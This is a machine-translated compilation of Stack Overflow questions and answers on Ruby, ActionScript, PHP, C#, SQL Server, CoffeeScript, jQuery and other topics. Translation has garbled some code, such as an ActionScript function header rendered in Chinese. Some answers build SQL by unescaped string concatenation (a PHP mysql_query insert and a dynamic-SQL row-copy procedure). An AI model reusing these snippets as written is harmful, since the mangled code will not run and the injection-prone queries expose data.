> 
> 时间：2012-09-28T22:25:37.733
> 
> 标签：ruby, metaprogramming

刚刚意识到`instance_eval`产生`self`作为关联块的参数（除了 1.9.2 版本中的错误：[http](http://www.ruby-forum.com/topic/189422) ://www.ruby-forum.com/topic/189422 ）

```
1.9.3p194 :003 > class C;end
1.9.3p194 :004 > C.new.instance_eval {|*a| a}
 => [#<C:0x00000001f99dd0>] 
1.9.3p194 :005 > 
```

这是在某处记录/规范的吗？查看[ruby​​-doc:BasicObject](http://ruby-doc.org/core-1.9.3/BasicObject.html#method-i-instance_eval)，看不到任何提到的块参数。

当它总是被定义时，是否有理由——除了一些纯粹的历史原因——明确地传递它？

* * *

我被这个击中的方式是：

```
l = lambda {  }
myobj.instance_eval(&l)  # barks 
```

这在 1.8.x 中运行良好（我猜是因为没有强制执行块 arity）。

然后升级到 1.9.2 - 它仍然有效！这是一个奇怪的巧合，因为即使严格执行 lambda 块参数（所以它会抱怨没有为 self 声明参数），但是由于上面链接的错误 - self 实际上没有在这个版本中传递..

然后升级到修复了该错误的 1.9.3，因此它开始抛出参数错误 - 对于一个较小的版本更改恕我直言，这非常令人惊讶。

因此，一种解决方法是声明参数，或者将 lambda 设置为块：

```
 l = proc {  }
  myobj.instance_eval(&l) # fine 
```

只是想描述完整的故事，以帮助其他人避免像我一样浪费时间-直到正确记录为止。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:37:55.463

阅读Ruby的源代码，我能解释的是：

instance_eval 正在执行这个：

```
return specific_eval(argc, argv, klass, self) 
```

依次运行：

```
 if (rb_block_given_p()) {
     if (argc > 0) {
         rb_raise(rb_eArgError, "wrong number of arguments (%d for 0)", argc);
     }
     return yield_under(klass, self, Qundef);
 } 
```

您可以看到它们传递`Qundef`了 VALUES 参数。

```
if (values == Qundef) {
    return vm_yield_with_cref(th, 1, &self, cref);
} 
```

在该特定代码行中，他们手动将 argc（参数计数）设置为 1，并将参数设置为“self”。稍后，准备块的代码将块的参数设置为这些参数，因此第一个参数 =“self”，其余为 nil。

设置块参数的代码正在执行：

```
 arg0 = argv[0];

   ... bunch of code ...

     else {
         argv[0] = arg0;
     }

     for (i=argc; i<m; i++) {
         argv[i] = Qnil;
     } 
```

导致：

```
1.9.3p194 :006 > instance_eval do |x, y, z, a, b, c, d| x.class end
 => Object 
1.9.3p194 :008 > instance_eval do |x, y, z, a, b, c, d| y.class end
 => NilClass 
```

为什么 ？我不知道，但代码似乎是故意的。很高兴向实施者提出这个问题，看看他们对此有什么看法。

[编辑]

这可能是这样的，因为您传递给 instance_eval 的块可能是也可能不是为它制作的（取决于 self 的代码被设置为您希望该块修改的类），相反，他们可能会假设您将传递给他们instance 您希望它们作为参数进行修改，这样它们也可以与 instance_eval 一起使用。

```
irb(main):001:0> blk = Proc.new do |x| x.class end
#<Proc:0x007fd2018447b8@(irb):1>
irb(main):002:0> blk.call
NilClass
irb(main):003:0> instance_eval &blk
Object 
```

当然这只是一个理论，没有官方文件我只能猜测。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:50:37.280

我刚刚发现，与主要用于字符串评估的#instance_eval 不同，主要用于块评估的#instance_exec 没有所描述的行为：

```
o = Object.new
o.instance_exec { |*a| puts "a.size is #{a.size}" }
  => a.size is 0 
```

这可能是一个意外的不一致，所以您可能已经发现了一个错误。将其发布在[Ruby 错误](http://bugs.ruby-lang.org/)上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-04T10:02:48.630

我刚刚在这里问了同样的问题：[Ruby lambda's proc's and 'instance_eval'](https://stackoverflow.com/questions/52618934/ruby-lambdas-procs-and-instance-eval?noredirect=1#comment92211606_52618934)

在阅读了答案并完成了一些代码之后，我想我明白为什么 ruby​​ 有这种奇怪的（恕我直言）不一致。

它基本上允许`Symbol#to_proc`工作。

例如`["foo", "bar"].each(&:puts)`是缩写`[...].each { |x| puts x }`

不是

`[...].each { self.puts }`

所以 ruby*​​ 也*将 self 作为第一个参数传递给 proc，所以基本上 proc 可以使用 self 或其第一个参数。

由于实例 eval*没有*根据定义显式传递参数，这*几乎*总是不可见的行为。

proc 是 lambda 时例外。这不起作用：

```
2.4.1 :015 > foo = -> { puts 'hi' }
 => #<Proc:0x007fcb578ece78@(irb):15 (lambda)> 
2.4.1 :016 > [1, 2, 3].each(&foo)
ArgumentError: wrong number of arguments (given 1, expected 0)
    from (irb):15:in `block in irb_binding'
    from (irb):16:in `each'
    from (irb):16 
```

所以我认为这成为问题的唯一一次是 instance_eval 与某个未知值一起使用时，您不知道 proc 是否为 lambda。在这种情况下，您必须这样做：

`proc_var.lambda? ? instance_exec(&proc_var) : instance_eval(&proc_var)`

奇怪（对我来说）红宝石并没有为你做这件事。

但我想你可以这样做：

```
alias original_instance_eval instance_eval 
def instance_eval(*args, &block)
  block&.lambda? ? instance_exec(&block) : original_instance_eval(*args, &block)
end 
```

# actionscript-3 - 缩放到和从点

> ID：12648161
> 
> 赞同：0
> 
> 时间：2012-09-28T22:26:25.410
> 
> 标签：actionscript-3, apache-flex, zooming, scale

我正在尝试将 DisplayObject 缩放到某个点。我认为这很容易，但我现在花了一天时间试图弄清楚。

基本上，我认为这*应该*有效。强调应该。

```
//newPoint is the point being centered. There is no initial scaling, so I do not need to compensate for that (yet)
//scale is the zoom level
//container is the parent of the obj
//obj is the object being scaled/panned
var p:Point = new Point(
    ( this.container.width - this.obj.width * scale + newPoint.x * scale ) / 2, 
    ( this.container.height - this.obj.height * scale + newPoint.y * scale ) / 2 
);

this.obj.scaleX = this.obj.scaleY = scale;
this.obj.x = p.x;
this.obj.y = p.y; 
```

如果比例为 1，它将使点居中，但随着比例的增加，它会越来越远离中心。我已经尝试了几十种不同的方法。[我在几个站点上看到的这种方法](https://gist.github.com/3092911)产生了相同的确切结果。有人知道如何让它工作吗？

**编辑 10-1-12**：作为后续，我将 LondonDrugs_MediaServices 提供的[代码片段](https://stackoverflow.com/questions/12571958/as3-scale-parent-mcs-center-to-child-mcs-center/12572155#12572155)作为我最初问题的基础。我需要能够以相对于未缩放图像的特定比例缩放到特定点（想想谷歌地图如何缩放到特定位置）。为此，我必须在运行翻译代码之前将我的图像集中在该点上。我已经在下面发布了附加代码。对于其他用途（捏缩放、滚动和双击），我使用了 Vesper 提供的代码，效果很好。

```
//obj is the object being translated
//container is its parent
//x and y are the coordinates to be zoomed to, in untranslated scaling
//obj.scaleX and obj.scaleY are always identical in my class, so there is no need to account for that

//calculates current center point, with scaling
var center:Point = new Point( ( this.container.width - this.obj.width * this.obj.scaleX ) / 2, ( this.container.height - this.obj.height * this.obj.scaleX ) / 2 );

//calulcates the distance from center the point is, with scaling
var distanceFromCenter:Point = new Point( this.obj.width * this.obj.scaleX / 2 - x * this.obj.scaleX, this.obj.height * this.obj.scaleX / 2 - y * this.obj.scaleX );

//center the object on that specific point
this.obj.x = center.x + distanceFromCenter.x;
this.obj.y = center.y + distanceFromCenter.y; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:33:46.133

```
var mat:Matrix=new Matrix();
mat.translate(-p.x,-p.y);
mat.scale(desiredScale,desiredScale);
mat.translate(p.x,p.y);
yourObject.transform.matrix=mat; 
```

核心点是缩放是在 (0,0) 附近完成的，但是您可以使用描述仿射变换的矩阵来完成。您首先制作一个空矩阵（即不转换的矩阵），然后对其应用一组转换。首先，通过平移 -1* 坐标将所需点放置在 (0,0) 处，然后缩放，然后平移回来。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-09T01:36:58.057

嗨，伙计们....谢谢您的评论...我找到了答案...代码：

gambar.addEventListener(TransformGestureEvent.GESTURE_ZOOM , onZoom);
函数onZoom（事件：TransformGestureEvent）：无效{

```
 var locX:Number=event.localX;

    var locY:Number=event.localY;

    var stX:Number=event.stageX;

    var stY:Number=event.stageY;

    var prevScaleX:Number=gambar.scaleX;

    var prevScaleY:Number=gambar.scaleY;

    var mat:Matrix;

    var externalPoint=new Point(stX,stY);

    var internalPoint=new Point(locX,locY);

    gambar.scaleX *= event.scaleX;

    gambar.scaleY *= event.scaleY;

     if(event.scaleX>1 && gambar.scaleX>6){

         gambar.scaleX=prevScaleX;

         gambar.scaleY=prevScaleY;

       }

     if(event.scaleY>1 && gambar.scaleY>6){

         gambar.scaleX=prevScaleX;

         gambar.scaleY=prevScaleY;

       } 

      if(event.scaleX<1 && gambar.scaleX<0.8){

         gambar.scaleX=prevScaleX;

         gambar.scaleY=prevScaleY;

       }

     if(event.scaleY<1 && gambar.scaleY<0.8){

         gambar.scaleX=prevScaleX;

         gambar.scaleY=prevScaleY;

       }  

     mat=gambar.transform.matrix.clone();

     MatrixTransformer.matchInternalPointWithExternal(mat,internalPoint,externalPoint);

     gambar.transform.matrix=mat;

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-01T21:27:08.480

矩阵的答案是绝对正确的，但是如果您碰巧是 Club GreenSock 会员，您可以使用 TransformAroundPointPlugin 使用非常简单的代码获得一些不错的功能

[http://www.greensock.com/as/docs/tween/com/greensock/plugins/TransformAroundPointPlugin.html](http://www.greensock.com/as/docs/tween/com/greensock/plugins/TransformAroundPointPlugin.html)

您可以在此处的插件资源管理器中看到一个示例：http: [//www.greensock.com/tweenlite/#plugins](http://www.greensock.com/tweenlite/#plugins)

我用它来补间我所有的缩放，并且比我尝试手动执行此操作时具有更好的性能。IMO 整个图书馆都物有所值（不，除了喜欢图书馆之外，我没有任何联系）。如果您需要任何其他功能，我会考虑它。它还具有 ThrowProps 插件 ( [http://www.greensock.com/throwprops/](http://www.greensock.com/throwprops/) )，如果您要在移动设备上拥有一个边界框，并且希望顺利返回边界，这非常重要。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-28T23:01:05.863

将 obj.x 设置为 -px，将 obj.y 设置为 -py，将容器 scaleX 和 scaleY 设置为所需的值，并将 px 添加到容器 x，将 py 添加到容器 y。完毕！

# modal-dialog - UIAutomation - 如何使用 windowopendevent 处理程序绕过模式对话框阻塞？

> ID：12648165
> 
> 赞同：3
> 
> 时间：2012-09-28T22:27:05.437
> 
> 标签：modal-dialog, microsoft-ui-automation

我正在尝试为我们的一个产品构建一个自动化测试框架。一些测试用例涉及在模态对话框中执行自动化。但是，模式对话框会阻止 UIAutomation 代码执行。换句话说，如果我有一个由 UIAutomation 打开的模态对话框，那么在我关闭模态对话框之前什么都不会发生。

为了在模态对话框显示时执行 UIAutomation 代码，我一直在尝试注册一个 windowopenedevent 处理程序，该处理程序在打开模态对话框时捕获它，因此我可以在 windowopenedevent 处理程序中执行其余测试。但是，处理程序根本没有捕获事件。我不知道出了什么问题，有什么建议吗？

这种情况的其他解决方法也是受欢迎的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-30T19:10:42.500

我遇到过几次，通常是在浏览器测试中。

我所做的是这样的：

```
>> before taking the action that causes the modal dialog to show up:
   >> start another thread (OR) launch a script asynchrounously
   >> then take the action

>> In the other thread or script:
    >> Sleep for 5 seconds or so
    >> Activate the dialog
    >> send keystrokes or call UI auto methods to dismiss the dialog 
```

关闭对话框后，您的测试应该会解除阻塞。

这一直对我有用。

# php - 匹配相邻字符的正则表达式模式

> ID：12648171
> 
> 赞同：0
> 
> 时间：2012-09-28T22:28:10.710
> 
> 标签：php, regex, preg-match-all

我正在寻找可以匹配 php.ini 中字符串中相邻字符的正则表达式模式。

例如，如果我有字符串“1234”，我希望它匹配并返回

```
1
12
123
1234 
```

这可以用 php 中的正则表达式来实现吗？

我试过了

```
$testString = '1234';
preg_match_all('/.+/', $testString, $matches); 
```

但这只会返回整个字符串。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:23:59.023

使用`strrev`技巧是可能的>>

***代码：***

```
$s = '1234';
preg_match_all('/(?=(.+$)).?/', strrev($s), $m);
foreach(range(sizeof($m[1]), 0) as $i) print strrev($m[1][$i]) . "\n"; 
```

***输出：***

```
1
12
123
1234 
```

看[这个](http://ideone.com/eFAZ9)演示。

* * *

但是，您也应该使用没有正则表达式的简单解决方案>>

***代码：***

```
$s = '1234';
foreach(range(1, strlen($s)) as $i) print substr($s, 0, $i) . "\n"; 
```

***输出：***

```
1
12
123
1234 
```

[在此处](http://ideone.com/pVkzf)检查此代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:16:36.527

是否可以？是的。合理吗？可能不是。

这是 Perl 中的一个演示，只是为了展示它可以通过您的特定示例完成：

```
#!/usr/bin/perl -l

my $string = "abcd";

my $pattern = qr{
    ^
    (?=  ( .{1} )  )
    (?=  ( .{2} )  )
    (?=  ( .{3} )  )
    (?=  ( .{4} )  )
}x;

my @captures = ($string =~ $pattern);

print for @captures; 
```

运行时会产生以下输出：

```
a
ab
abc
abcd 
```

PHP 使用的 PCRE 库完全能够做到这一点。但即使是我也不会那样做。

至于任意分组，这变得更加棘手，需要递归模式和更严重的魔法。除了某种扩展性证明类型的编程竞赛，我不会这样做，而不是你希望维护的真实代码，而不是被枪杀。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-28T22:52:37.763

不，这不能（合理地）用正则表达式完成。

这就是为什么发明了循环。`for`我敢肯定，用一个简单的循环来煮东西是很容易的。

例子：

```
$str = "1234";
for ($i = 0; $i < strlen($str); $i++) {
    echo substr($str, 0, $i+1) . "\n";
} 
```

# c# - 处理 DataGridView 中的空单元格

> ID：12648173
> 
> 赞同：0
> 
> 时间：2012-09-28T22:28:24.617
> 
> 标签：c#, .net, sql-server-2008, accounting

如何处理 DataGridView 中的空单元格值，其中我有 3 列（帐户标题、借方、贷方），用户选择帐户的第一列，然后输入借方或贷方列，从而在每一行中留下一个空单元格. 我有一个条目涉及 3 个表。

```
create table Debit (debit_id, amount, **acct_id, entry_id);
create table Credit (credit_id, amount, **acct_id, entry_id);
create table Entry (entry_id, date); 
```

基本上我希望它看起来像[这样](http://www.edisonsattic.com/articles/images/QBTrust1/2.gif)。到目前为止我所做的是加入了那 3 张桌子

```
SELECT  Entry.entry_id, Entry.Date, Debit.acct_id, Debit.amount, 
Credit.acct_id, Credit.amount FROM Entry FULL OUTER JOIN Debit
ON Entry.entry_id = Debit.entry_id FULL OUTER JOIN Credit
ON Entry.entry_id = Credit.entry_id 
```

在 DataGridView 中有 6 列。我还没有想到一个查询只显示借方和贷方账户在一列中的 3 列以及相应列中的金额，以及它如何处理借方和贷方列上的空单元格我所做的工作但在可用性方面并不好。

你能建议我这样做的方法吗？

** 账户表

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:11:56.413

如果您使用的是`DataGridView`我建议您使用更面向对象的方法，而不是直接传递 SQL 查询的结果。无论如何，您如何使用这种方法将更新推回？

这是一个例子。我知道它在 VB.Net 中，但它仍然应该有意义。

```
Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim entries As List(Of AccountEntry) = RetrieveEntries()

        DataGridView1.DataSource = entries

    End Sub

    Public Class AccountEntry
        Public Property Id As Integer
        Public Property Debit As Nullable(Of Decimal)
        Public Property Credit As Nullable(Of Decimal)
        Public Property EntryDate As DateTime
    End Class

    Public Function RetrieveEntries() As List(Of AccountEntry)
        Dim returnEntries As List(Of AccountEntry) = Nothing
        ' Do your database stuff here to retrieve a list of AccountEntry'
        Return returnEntries
    End Function

End Class 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:42:54.723

我认为建立工会可以解决您的问题。以下查询会将两组结果合并到一个结果集中：

select e.entry_id, e.Date, d.acct_id, d.amount from Entry as e join Debit as d on e.entry_id=d.entry_id

联合所有

select e.entry_id, e.Date, c.acct_id, c.amount from Entry as e join Credit as c on e.entry_id=c.entry_id

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:25:17.233

我推断（a）您正在使用数据绑定，并且（b）这是供用户输入数据的。如果它*用于*输入，那么我将放弃数据绑定并在代码中从网格中填充/读取。

# objective-c - 为什么 NSUserDefaults objectForKey 方法返回一个带有“0”而不是 nil 的字符串？

> ID：12648174
> 
> 赞同：0
> 
> 时间：2012-09-28T22:28:32.983
> 
> 标签：objective-c, ios, nsuserdefaults

为什么 NSUserDefaults objectForKey 方法返回一个带有“0”而不是 nil 的字符串？

文档状态，

> 返回值 与指定键关联的对象，如果未找到该键，则返回 nil。

```
NSDate * date = [[NSUserDefaults standardUserDefaults] objectForKey:OVERTIME_RATE_MARKER];

    if (date) {
      //something
    } 
```

上面的条件语句总是执行，因为如果找不到对象，它会返回一个类对象：__NSCFString 和“0”。什么时候应该返回“nil”

我当然可以测试字符串是否为“0”。但我真的不想那样做。

我还尝试使用 ID 作为类型。我不断得到一个带有“0”的__NSCFString。

谁能帮我解决这个问题？

任何帮助表示赞赏！

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:52:37.890

`nil`当密钥不存在时，此 API 肯定会返回。密钥已经在您的首选项中设置，或者您在`@"0"`读取它的代码之前将其设置到代码中的其他位置。

# sql-server-2008 - 创建 'util' - 存储过程部分，与 .net 帮助程序类一样

> ID：12648180
> 
> 赞同：-1
> 
> 时间：2012-09-28T22:29:01.313
> 
> 标签：sql-server-2008, stored-procedures

几分钟前，我只是在搜索一个简单的语法（SQL 服务器）查询，它将复制一个表 Row 。

这通常不时进行，在处理 ASP.net 项目时，使用*SQL SERVER 管理工作室*中的查询测试数据。所以其中一个常规操作是复制一行，将所需的列更改为彼此不同，然后使用查询测试数据

所以我遇到了 [- 这个存储过程 -](https://stackoverflow.com/questions/3967665/how-can-i-copy-a-row-into-same-table-with-sql-server-2008)作为 Dan Atkinson 的回答

但是将它添加到存储所有非测试目的的位置让我认为是否可以按排序顺序存储它们以便我可以区分

项目中使用的“utils”或“testingPurpose”

（管理树视图中的默认文件夹是 Programmabilty）这也可能是另一个文件夹，或者这不是一个选项？

如果没有，我想到了 `Utils.` 这样的前缀（如果没有其他方法存在）

```
dbo.Utils.CopyTableRow
dbo.Utils.OtherRoutineActions .... 
```

或者有一种指定的方式来实现我的想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-03T20:41:09.187

这是我制作的第一个“Util”存储过程，发现它是唯一通过 Util_ 为其添加前缀的解决方案

```
ALTER PROCEDURE [dbo].[Utils_TableRowCopy](
@TableName VARCHAR(50) ,
@RowNumberToCopy INT
)

AS
BEGIN

declare @RowIdentity sysname =
(SELECT name FROM sys.identity_columns WHERE object_id = object_id(@TableName)
 )

DECLARE @columns VARCHAR(5000), @query VARCHAR(8000);
SET @query = '' ;

SELECT @columns =
    CASE
        WHEN @columns IS NULL THEN column_name
        ELSE @columns + ',' + column_name
    END
FROM INFORMATION_SCHEMA.COLUMNS
WHERE (
    TABLE_NAME = LTRIM(RTRIM(@TableName))
    AND
    column_name <> LTRIM(RTRIM(@RowIdentity))
);

SET @query = 'INSERT INTO ' + @TableName + ' (' + @columns + ') SELECT ' + @columns + ' FROM ' + @TableName + ' WHERE ' + @RowIdentity + ' = ' + CAST(@RowNumberToCopy AS VARCHAR);

--SELECT SCOPE_IDENTITY();
declare  @query2 VARCHAR(100) =  ' Select Top 1 * FROM '+ @TableName +' Order BY ' + @RowIdentity + ' desc' ;
EXEC (@query);
EXEC (@query2); 
```

结尾

# ruby-on-rails - Rails DateTime 转换和时间比较

> ID：12648182
> 
> 赞同：0
> 
> 时间：2012-09-28T22:29:21.623
> 
> 标签：ruby-on-rails, ruby, datetime, time

我在比较 Rails 中的时间时遇到了一些麻烦。我想检查一个事件是否在一个窗口内，如果是，然后找出哪个事件或窗口最后开始，哪个最先结束。我的代码如下。

```
startingTime = 0
endingTime = 0
time = 0

eventTimeStart = Time.parse(event.start.to_s) #Need to convert DateTime to just Time
windowTimeStart = Time.parse(application.reportStart.to_s)

eventTimeEnd = Time.parse(event.end.to_s) #Need to convert DateTime to just Time
windowTimeEnd = Time.parse(application.reportEnd.to_s)

days = 0

if((windowTimeStart > eventTimeStart) || !(eventTimeStart < windowTimeEnd))
  startingTime = windowTimeStart
  if((eventTimeStart > windowTimeEnd))
    days -= 1
   end
else
  startingTime = eventTimeStart
end

if((windowTimeEnd > eventTimeEnd) && (eventTimeEnd > windowTimeStart))
  endingTime = eventTimeEnd
else
  if((eventTimeEnd < windowTimeStart))
    days -= 1
   end
  endingTime = windowTimeEnd
end 
```

我已经手写了每个案例，但是在运行时它似乎与预期的不同。好像我总是进入窗口时代。Rails 对 Times 使用的方法是否与我想的不同？你甚至可以用这种方式比较时间吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T05:37:09.170

如果您想查看间隔是否重叠，这个简单的检查将：

```
overlaps = interval_1_start < interval_2_end && interval_1_end > interval_2_start 
```

我不明白这个问题的其余部分，但我只是希望你没有两个大循环用于`event`和`application`围绕你上面粘贴的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T16:51:40.907

感谢您的建议姆拉登。

为了使它工作，我将所有时间对象传递给我制作的将它们转换为分钟的方法。

```
def self.getMin(time)
    return((time.hour*60) + time.min)
end 
```

我在所有支票上都调用了它，现在它似乎起作用了。

```
if((getMin(windowTimeStart) > getMin(eventTimeStart)) || !(getMin(eventTimeStart) < getMin(windowTimeEnd)))
  startingTime = windowTimeStart
  if((getMin(eventTimeStart) > getMin(windowTimeEnd)))
    days -= 1
   end
else
  startingTime = eventTimeStart
end 
```

我确信有更好的方法来检查，但是它现在确实有效。

# coffeescript - CoffeeScript：如何同时使用胖箭头和 this？

> ID：12648187
> 
> 赞同：33
> 
> 时间：2012-09-28T22:30:13.560
> 
> 标签：coffeescript, this, arrow-functions

我有一个咖啡脚本类，它有一些 jquery 事件监听器。我想使用粗箭头`=>`来避免引用类，但我仍然需要引用通常与`this`. 我怎样才能同时使用两者？

```
class PostForm
    constructor: ->
        $('ul.tabs li').on 'click', =>
            tab = $(this)
            @highlight_tab(tab)
            @set_post_type(tab.attr('data-id'))

    highlight_tab: (tab)->
        tab.addClass 'active'

    set_post_type: (id) ->
        $('#post_type_id').val(id) 
```

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-09-28T23:12:05.110

CoffeeScript 链接`this`到`@`外部上下文，因此您无法访问 jQuery 提供的上下文（也就是所需的“this”）。改用[`event.target`](http://api.jquery.com/category/events/event-object/)：

```
class PostForm
    constructor: ->
        $('ul.tabs li').on 'click', (event) =>
            tab = $(event.target)
            @highlight_tab(tab) 
```

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2013-03-14T23:48:23.583

## 使用 evt.currentTarget

您可能应该使用[`evt.currentTarget`](http://api.jquery.com/event.currentTarget/)（相当于`this`）而不是[`evt.target`](http://api.jquery.com/event.target/)（不是）。如果您正在点击`click`通知的节点具有子节点，则`evt.target`可能是这些子节点之一，而不是您添加`click`处理程序的节点。

有关此行为的演示，请参阅[http://codepen.io/ddopson/pen/erLiv](http://codepen.io/ddopson/pen/erLiv)。（单击内部红色框以查看`currentTarget`指向红色 div 而`target`指向事件处理程序注册的外部蓝色 div）

```
$('ul.tabs li').on 'click', (event) =>
  tab = $(event.currentTarget)
  @highlight_tab(tab) 
```

## 回答所提出的问题 - 获取 `=>` 和 `this`：

您可以执行以下操作...

```
$('ul.tabs li').on 'click', (event) =>
  tab = $(` this `)     # MAKE SURE TO ADD THE SPACES AROUND `this`
  @highlight_tab(tab) 
```

这些空间很关键，因为它们可以防止咖啡`this`大嚼`_this`。

## 使用 `self` 和 `->`

或者，执行以下操作...

```
self = this
$('ul.tabs li').on 'click', (event) ->
  tab = $(this)
  self.highlight_tab(tab) 
```

这类似于 CQQL 的答案，除了我更喜欢惯用的`self`用作变量名；我的[VIM 语法高亮规则将](https://github.com/ddopson/dotfiles/blob/master/.vim/bundle/coffee-script.vim/syntax/coffee.vim#L66)颜色`self`作为一个“特殊”变量，就像`this`,`arguments`或`prototype`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-28T23:14:51.863

我更喜欢这个版本，因为我更容易理解它。

```
class PostForm
    constructor: ->
        post_form = this

        $('ul.tabs li').on 'click', (event) ->
            tab = $(this)
            post_form.highlight_tab(tab) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-31T05:07:49.073

您可能希望从函数访问构造函数中设置的变量。这就是你的做法（关键是调用函数时首先用细箭头`self`提取）：`this`

```
class PostForm
    constructor: ->
        self = this

        @some_contrived_variable = true

        $('ul.tabs li').on 'click', ->
            tab = $(this)
            self.highlight_tab(tab)
            self.set_post_type(tab.attr('data-id'))

    highlight_tab: (tab) ->
        # Because of the fat arrow here you can now access @ again
        if @some_contrived_variable
            tab.addClass 'active'

    set_post_type: (id) ->
        $('#post_type_id').val(id) 
```

顺便说一句：[这是对何时使用胖箭头和瘦箭头的一个很好的解释。](https://gist.github.com/meandmax/355b7433eb68b47540c5)

概括：

1.  你在函数中使用这个（@）吗？
2.  您是否想稍后执行该功能，可能从不同的范围？

# ruby-on-rails - Ruby on Rails 网络 HTTP 或 HTTPParty

> ID：12648189
> 
> 赞同：1
> 
> 时间：2012-09-28T22:30:20.393
> 
> 标签：ruby-on-rails, ruby

我已经有一段时间了。我尝试使用 net http 连接到 https url，但没有成功。我已经尝试过 http 派对并获得未初始化的常量 httpparty。我正在运行 rails 3.2.7。我将 httpparty 添加到 gem 文件中。

有人可以提供一个示例，说明将参数发送到 https url 并接收响应的问题。

代码：

```
options = {:id => params[:id], :code => params[:code]}
response = HTTPParty.post('https://test.com', options) 
```

宝石文件：

```
gem "httparty", "~> 0.9.0" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:38:27.193

```
HTTParty.get('https://google.com', :query => {:q => 'stack overflow'}) 
```

如果这对您不起作用，请显示您正在使用的代码。如果你得到一个未初始化的常量错误，你做错了什么。`bundle`添加到 Gemfile 后你运行了吗？

此外，它是`HTTParty`，不是`HTTPParty`。

# jquery - 我如何嵌入照片滑动

> ID：12648191
> 
> 赞同：1
> 
> 时间：2012-09-28T22:30:37.020
> 
> 标签：jquery, photoswipe

这是问题：

我将 photoswipe 上传到我的服务器并给它一个子域以在 iframe 中使用它。在我打开照片后，但是当我点击缩略图时，图片完全不是在 Jquery 上打开的。就像图书馆不工作

我在网上搜索了同样的问题，但如果有人可以帮助我解决这个问题，我找不到任何东西吗？

谢谢

# c# - 将数据列表添加到一个类，然后在不同的类中调用相同的数据列表

> ID：12648193
> 
> 赞同：0
> 
> 时间：2012-09-28T22:30:47.577
> 
> 标签：c#, .net, caching

我正在缓存从我的数据库中提取的数据列表，我要做的就是从同一个缓存中提取数据，搜索它然后显示它。

```
CachedList.Add("SearchableItems", Items, null, DateTime.Now.AddSeconds(60), Cache.NoSlidingExpiration, CacheItemPriority.High, onRemove); 
```

我正在使用 System.Web.Caching；

然后我有另一个类来获取 SearchableItems 的列表，但是我看到的任何地方都说哦，只是使用

```
Cache["SearchableItems"] 
```

但是当我这样做时，它只是说类不能被继承。有人可以发布一个将列表放入缓存然后检索它的超级基本示例。您还可以提供一些代码上下文吗，因为我发现的很少

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T03:50:02.897

您可以尝试使用此代码

添加：

```
var list = new List<string>();
...
if (Cache["Key1"] == null)
 { 
      Cache.Insert("Key1", list, null, DateTime.Now.AddMinutes(2), Cache.NoSlidingExpiration);
 } 
```

选择：

```
var list = Cache["Key1"] as List<string>; 
```

# php - 8000 字的 mySQL 类型

> ID：12648194
> 
> 赞同：0
> 
> 时间：2012-09-28T22:30:58.820
> 
> 标签：php, mysql

我有 8000 个单词我想扔进我的 mySQL 数据库的一个字段中。但是它不允许我将其转储。我将数据类型设置为长文本。我可以做些什么来确保可以将 8000 个单词存储到一个字段中？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:39:13.140

根据[手册](http://dev.mysql.com/doc/refman/5.5/en/string-type-overview.html)，您最多可以在一个字段中存储 4Gb `LONGTEXT`- 也取决于其他一些情况 - 所以除非您的单词真的很长（我的意思是真的很长！），长度不是问题。

您如何将文本发送到数据库？可能还涉及一些其他因素，例如帖子大小、服务器超时等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:05:57.467

非常适合我，

```
<?php
    $longestWord = "";

    for($i=1; $i<=8000; $i++){
       $longestWord .= $i . " longestWordInTheWorldEver ";
    }

    mysql_query("INSERT INTO checkTable SET words = '$longestWord'");

?> 
```

# jquery - Jquery - 如何在动态创建后添加事件

> ID：12648195
> 
> 赞同：1
> 
> 时间：2012-09-28T22:30:59.243
> 
> 标签：jquery

我正在动态创建一个 div，然后将其附加到一个容器中：

```
var str = '<div class="dimsdiv" id="'+dim.src+'" cursor:pointer;"></div>'; 
$('#fpdiv').append(str); 
```

现在我需要为那些 div 添加一个悬停。我试图只引用它，但后来发现我需要考虑 .on() 。我试过这个（之前）：

```
$('#'+dim.src).hover(function{},function{}); 
```

但正如预期的那样，这并没有奏效。我也试过这个：

```
$('#'+dim.src).on('hover','(function{},function{})'); 
```

但似乎无法正确使用语法。有人可以帮忙吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:39:42.617

你可以试试这个

```
var str = $('<div/>', {
    text:'Hello',
    class:'dimsdiv',
    id:'dim_src',
    style:'cursor:pointer',
    mouseenter:function(){ ... },
    mouseleave:function(){ ... }
});
$('#fpdiv').append(str); 
```

还要删除`.`from `dim.src`，而不是使用`dim_src`as `id`，它在 jQuery 中用作`class`选择器，不知道你为什么使用它但它`$('#'+dim.src)`是无效的。

[**演示**](http://jsfiddle.net/mGNt5/1/)。

* * *

## 回答 #2

> 赞同：2
> 
